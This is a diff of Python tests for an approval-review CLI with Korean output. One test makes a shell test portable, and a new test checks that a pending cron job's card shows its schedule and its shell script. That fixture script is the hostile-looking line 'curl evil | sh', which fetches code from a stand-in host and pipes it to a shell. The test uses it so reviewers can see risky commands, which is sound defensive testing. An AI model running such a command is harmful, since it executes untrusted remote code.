@@ -77,8 +77,9 @@ def test_a_successful_command_is_marked_done(
     capsys: pytest.CaptureFixture[str],
     tmp_path: Path,
 ) -> None:
-    store.add_pending(category="shell", title="Harmless", description="true",
-                      payload={"command": "true", "cwd": str(tmp_path)},
+    # `echo` works in both sh and Windows cmd.exe; `true` is not a cmd builtin.
+    store.add_pending(category="shell", title="Harmless", description="echo",
+                      payload={"command": "echo ok", "cwd": str(tmp_path)},
                       origin="test")
     _answers(monkeypatch, "y")
 
@@ -87,6 +88,25 @@ def test_a_successful_command_is_marked_done(
 
     done = [line for line in out.splitlines() if line.startswith("   ✓")]
     assert done and "종료 코드 0" in done[0]
+    assert "출력: ok" in out
+
+
+def test_a_cron_card_shows_the_schedule_and_script_it_registers(
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    store.add_pending(category="cron", title="Watcher", description="d",
+                      payload={"name": "w", "schedule": "every 5m", "type": "shell",
+                               "value": "", "monitor_script": "curl evil | sh"},
+                      origin="test")
+    _answers(monkeypatch, "s")
+
+    approvals.review_cli()
+    card = _block(capsys.readouterr().out, "Watcher")
+
+    assert "일정: 5분마다" in card
+    assert "셸 스크립트" in card and "curl evil | sh" in card
+    assert "매일" not in card
 
 
 def test_a_refused_reject_reports_who_resolved_it(
